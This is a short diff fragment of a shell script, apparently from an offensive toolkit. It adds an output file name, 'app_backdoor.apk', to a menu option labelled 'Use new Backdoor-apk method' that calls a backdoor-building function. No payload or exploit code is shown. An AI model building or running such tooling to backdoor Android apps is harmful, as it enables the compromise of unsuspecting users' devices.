@@ -1364,6 +1364,7 @@ case $method in
 "Use new Backdoor-apk method")
 echo ""
 spinlong
+outf="app_backdoor.apk"
 gboor2
 rm -f $apkconfig >/dev/null 2>&1
 touch $apkconfig
